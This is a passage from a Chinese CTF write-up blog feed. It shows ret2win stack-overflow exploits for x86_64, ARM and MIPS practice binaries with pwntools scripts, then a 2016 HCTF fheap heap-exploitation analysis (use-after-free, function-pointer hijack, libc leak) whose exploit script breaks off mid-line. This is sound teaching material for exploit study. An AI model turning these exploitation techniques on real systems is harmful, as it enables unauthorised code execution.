process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x400764</span> <span class="comment"># 57-64理论上都可以</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-ret2win-armv5"><a href="#0x03-ret2win-armv5" class="headerlink" title="0x03 ret2win_armv5"></a>0x03 ret2win_armv5</h3><p>虽然不是第一次见到异构pwn题，但是是第一次做，所以这里记录一下基本的环境配置步骤和arm汇编相关的知识，但不会深入展开，主打一个够用就行。</p><h5 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install gdb-multiarch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential gcc-arm-linux-gnueabi libc6-armel-cross</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /etc/qemu-binfmt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">ln</span> -s /usr/arm-linux-gnueabi /etc/qemu-binfmt/arm</span></span><br></pre></td></tr></table></figure><h5 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h5><p>如果想要在终端运行arm架构的程序，那就用以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-arm-static ./your_exec_file</span></span><br></pre></td></tr></table></figure><p>如果找不到动态链接库，就加个<code>-L /usr/mipsel-linux-gnu/</code>在中间就行，调试同理。</p><h5 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h5><p>如果想要调试arm架构的程序，使用以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-arm-static -g 9999 ./your_exec_file</span></span><br></pre></td></tr></table></figure><p>然后打开另一个终端，输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb-multiarch -q ./your_exec_file</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> solib-search-path /usr/arm-linux-gnueabi/lib/</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote :9999</span></span><br></pre></td></tr></table></figure><p>上面的9999是端口，数字可以自己定。第三行命令是为了让gdb找到动态链接库。如果是aarch64架构的，也是一样的操作，换一下动态链接库路径为&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;lib&#x2F;即可。</p><h5 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h5><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81.png" alt="ret2win_armv5汇编代码"></p><p>首先先看看arm寄存器方面和x86的不同之处。</p><ul><li>32位的arm有13个通用寄存器，分别是R0-R12。</li><li>R0在常规操作中可用于存储临时值，也可以用于存储函数的第一个参数或返回结果。</li><li>在ARM架构中约定指定函数前四个参数存储在R0~R3寄存器中。</li><li>R7寄存器在函数调用中负责存储系统调用号。</li><li>R11寄存器，又称FP，可以用来记录回溯信息,也可以当做局部变量来使用。</li><li>R13是栈指针寄存器，又称SP，相当于esp。</li><li>R14为链接寄存器，又称LR，用于保存调用函数的下一条指令地址，用于被调用函数(子函数)结束工作后返回调用函数(父函数)。有点像ret地址。</li><li>R15为程序计数器，又称PC，类似于X86架构下的EIP寄存器负责保存目标地址，与x86不同的点在于PC在ARM状态下存储当前指令+4的地址。这个寄存器可读可写，对PC进行写操作可以改变程序执行流，而且是立马就变。</li><li>还有一些特殊的标志寄存器，这里不做介绍。</li></ul><p>现在我们来看代码。首先把LR和R11压入栈，然后将SP+4存到R11，SP-0x20开辟栈空间。这和x86调用函数如出一辙。注意此时R11就指向返回地址了。</p><p>调用read的时候把第一个参数放到了R0，第二个参数是R11-0x24，放到了R1，第三个参数在R2。从这里可以确认的一点是我们输入的地方距离存放LR的地方隔了0x24。所以填充0x24padding再写个ret2win的地址，我们就算是利用栈溢出劫持了程序执行流。</p><p>函数结束之后先将R11-4赋给了SP，再分别将R11和PC出栈。那么这时，PC寄存器里地址就是我们写入的ret2win的函数地址。</p><h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><p>因为是第一次做arm的pwn题，我们还是详细调试一下看看，加深理解。首先我们开启gdb-multiarch之后，连接qemu端口，设置好动态链接库。之后断点在pwnme函数，再往后就单步执行看栈和寄存器变化就可以了。</p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%950.png" alt="ret2win_armv5调试0"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%951.png" alt="ret2win_armv5调试1"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%952.png" alt="ret2win_armv5调试2"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%953.png" alt="ret2win_armv5调试3"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%954.png" alt="ret2win_armv5调试4"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%955.png" alt="ret2win_armv5调试5"></p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x105EC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x04-ret2win-mipsel"><a href="#0x04-ret2win-mipsel" class="headerlink" title="0x04 ret2win_mipsel"></a>0x04 ret2win_mipsel</h3><p>也是第一次接触的mips的pwn，和arm一样，先讲环境配置。</p><h5 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-user</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install libc6-mipsel-cross</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /etc/qemu-binfmt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">ln</span> -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel</span></span><br></pre></td></tr></table></figure><h5 id="运行程序-1"><a href="#运行程序-1" class="headerlink" title="运行程序"></a>运行程序</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-mipsel-static ./your_exec_file</span></span><br></pre></td></tr></table></figure><p>如果找不到动态链接库，就加个<code>-L /usr/mipsel-linux-gnu/</code>在中间就行，调试同理。</p><h5 id="调试程序-1"><a href="#调试程序-1" class="headerlink" title="调试程序"></a>调试程序</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-mipsel-static -g 9999 ./your_exec_file</span></span><br></pre></td></tr></table></figure><p>然后打开另一个终端，输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb-multiarch -q ./your_exec_file</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> solib-search-path /usr/mipsel-linux-gnu/lib/</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote :9999</span></span><br></pre></td></tr></table></figure><p>和arm调试是一样的。</p><h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_mipselRA%E5%85%A5%E6%A0%88.png" alt="ret2win_mipselRA入栈"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_mipsel%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81.png" alt="ret2win_mipsel汇编代码"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_mipselRA%E5%87%BA%E6%A0%88.png" alt="ret2win_mipselRA出栈"></p><p>mips的指令和x86、arm的指令长得差很远。先来看一些基础的知识。</p><ol><li>MIPS32 架构中是没有 EBP 寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈</li><li>传参过程中，前四个参数a0−a3，多余的会保存在调用函数的预留的栈顶空间内</li><li>MIPS 调用函数时会把函数的返回地址直接存入 $RA 寄存器</li></ol><p>可以注意到函数初始时RA寄存器的内容被入栈到了距离SP寄存器0x38+4的位置，函数退出时RA出栈。所以我们只要栈溢出到SP+0x60处写入ret2win函数地址即可成功劫持程序执行流。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process([<span class="string">&#x27;qemu-mipsel-static&#x27;</span>, <span class="string">&#x27;./ret2win_mipsel&#x27;</span>])</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x400A00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">36</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『BUU』2016HCTF_fheap</title>
      <link href="/2024/2016HCTF-fheap/"/>
      <url>/2024/2016HCTF-fheap/</url>
      
        <content type="html"><![CDATA[<h2 id="2016HCTF-fheap"><a href="#2016HCTF-fheap" class="headerlink" title="2016HCTF fheap"></a>2016HCTF fheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个程序是一个字符串管理器，程序只有两个功能，一个是create，一个是delete，有两个类似于结构体的变量，我们可以稍微优化一下伪代码。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="type">Data</span>            struc ; (sizeof=<span class="number">0x20</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> ptr_content     dq ?</span><br><span class="line"><span class="number">00000008</span> content2_if_use dq ?</span><br><span class="line"><span class="number">00000010</span> content_len     dq ?</span><br><span class="line"><span class="number">00000018</span> ptr_free_func   dq ?</span><br><span class="line"><span class="number">00000020</span> <span class="type">Data</span>            ends</span><br><span class="line"><span class="number">00000020</span></span><br><span class="line"><span class="number">00000000</span> ; <span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> string          struc ; (sizeof=<span class="number">0x10</span>, mappedto_10)</span><br><span class="line"><span class="number">00000000</span> <span class="type">INUSE</span>           dd ?</span><br><span class="line"><span class="number">00000004</span> field_4         dd ?</span><br><span class="line"><span class="number">00000008</span> <span class="type">Data</span>            dq ?</span><br><span class="line"><span class="number">00000010</span> string          ends</span><br><span class="line"><span class="number">00000010</span></span><br></pre></td></tr></table></figure><p>优化之后，我们来分别看一下两个函数功能。</p><h5 id="create"><a href="#create" class="headerlink" title="create"></a>create</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> *<span class="title">ptr</span>;</span> <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">struct</span> Data *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give string size:&quot;</span>);</span><br><span class="line">  nbytes = read_10b();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )                       <span class="comment">// 不能超过sbrk大小</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;got elf!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )                        <span class="comment">// 长度大于15的时候才malloc</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;malloc faild!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      ptr-&gt;ptr_content = (__int64)dest;</span><br><span class="line">      ptr-&gt;ptr_free_func = (__int64)free_double_ptr;<span class="comment">// 一个free双重指针的函数指针，UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="type">char</span> *)ptr, buf, nbytesa);       <span class="comment">// 长度小于15则直接存在ptr下</span></span><br><span class="line">      ptr-&gt;ptr_free_func = (__int64)free_single_ptr;<span class="comment">// 一个free函数，UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    LODWORD(ptr-&gt;content_len) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">list</span>[i].INUSE )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">list</span>[i].INUSE = <span class="number">1</span>;                      <span class="comment">// INUSED</span></span><br><span class="line">        <span class="built_in">list</span>[i].Data = (__int64)ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )                              <span class="comment">// 最多15个chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> Data *))ptr-&gt;ptr_free_func)(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create函数最大的特点是，只有size大于15才会申请chunk，否则直接存在ptr结构体下。所以ptr更像是一个联合体。ptr还储存了一个函数指针，用在delete函数中拿来释放chunk。可以发现这两个函数都存在UAF漏洞。另一个结构体储存了一个INUSE标志和指向ptr结构体的指针。</p><h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give me the string id you want to delete\nid:&quot;</span>);</span><br><span class="line">  index = read_10b();</span><br><span class="line">  <span class="keyword">if</span> ( index &gt;= <span class="number">0x11</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)index + <span class="number">1</span>) )<span class="comment">// ptr非空，没检查INUSED，可以DOUBLE FREE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(_QWORD))(*((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)index + <span class="number">1</span>) + <span class="number">24LL</span>))(*((_QWORD*)&amp;<span class="built_in">list</span>+ <span class="number">2</span> * (<span class="type">int</span>)index+ <span class="number">1</span>));</span><br><span class="line">      *((_DWORD *)&amp;<span class="built_in">list</span> + <span class="number">4</span> * (<span class="type">int</span>)index) = <span class="number">0</span>;  <span class="comment">// 将INUSED置零</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数检查了ptr位置却没有检查INUSE标志，所以可以double free。调用了函数指针指向的函数，参数是ptr结构体本身。这里很容易就想到劫持函数指针来改变程序的执行流。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果我们劫持了函数指针为system，并且在某个chunk中写入了sh，delete这个chunk就可以getshell了。但是整个程序都没有泄露地址的功能可以给我们利用，所以首先要思考的是如何获取libc地址。没有条件就自己创造条件。我们可以劫持函数指针为puts或者printf函数来泄露地址。</p><p>劫持函数指针的问题很好想，可以利用fastbin的特性来劫持。程序会为每一个string申请一块0x20（实际是0x30）的堆来储存ptr结构体。如果我们先申请两块size小于15的chunk，释放掉后在申请一个0x20的chunk，通过UAF漏洞，我们就可以控制之前申请的chunk的其中一块。</p><p>程序开了PIE，尽管有足够的长度写入地址，如果不知道程序基址，我们也只能写入一字节来改变函数指针。原本free函数的地址在0xD52，显然就没法用plt段中的地址了，因为我们要找到函数地址应该也满足0xDXX的形式。取而代之的，我们去找<code>call puts</code>这样的跳转指令。然后可以找到在0xD1A和0xD2D处都有，其中一个会return另一个则跳转到menu，两个都可以利用。而将他本身作为参数，delete被劫持的chunk，我们就能得到程序的基址。有了基址我们就可以利用任意地址的函数了，但是想要获得libc地址，只能将got表的地址作为参数传入puts，显然这很难实现，因为参数只能是ptr结构体地址，所以没法继续用puts函数。取代他的是printf函数，我们将格式化字符串chunk上我们就可以利用偏移来获取栈上残留的libc地址。因为有了基址，我们就可以用printf在plt段的地址了。</p><p>想到这里，忽然想到一个问题，能不能如法炮制地，在某个0xDXX地址出找到一个call printf的跳转指令，这样不就不需要泄露基址也能获得libc地址了吗？好巧不巧，还真有，在0xD88处就有一个。这个指令位于delete函数中，这并不影响我们泄露地址，我们在printf完地址后，只要输入一个错误的index就可以让delete函数什么也不干直接返回menu。</p><p>值得注意的是，这里存在一个栈平衡问题。如果我们直接让函数指针变成0xD88处，libc在执行printf时会检查al寄存器，如果不为零，则会执行movaps相关的指令，这个指令要求操作数16位对齐，否则程序会卡住。所以这里我们选择0xD86地址，可以将al先置零，这样可以不用理会栈平衡问题。</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在第二种思路中，唯一要调试的其实只有printf的格式化字符串偏移，找到一个合适的libc地址拿来泄露。BUU没有提供libc文件，但是说了是Ubuntu16的系统，所以大概是glibc2.23的某一个版本，所以在本地调试中patchelf了一下程序（2.23_11.3_amd64）。我们在劫持完函数指针后断点在printf处看看栈布局，找到一个__libc_start_main+240的地址在偏移176处，其实也就是__libc_start_main_ret的地址，通过远程发现依然可以获取到它，但是结果不太一样。</p><p><img src="https://c-lby.top/images/BUU/2016HCTF_fheap/printf%E6%A0%88%E5%B8%83%E5%B1%80.png" alt="printf栈布局"></p><p>这里的低三位是0x840，但实际上在远程获得的偏移是0x830。在libc database中查到多种结果，最后试得libc6_2.23-0ubuntu11_amd64才是正确版本。其实栈的前面还有很多其他的libc地址，但是本地和远程布局不太一样获取不到，所以找一个离程序起始比较近的地方去获取libc可能比较稳定。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29570</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn-f&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)  <span class="comment"># 正确的版本是libc6_2.23-0ubuntu11_amd64</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn-f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;3.quit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;create &#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;str:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;id is &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span 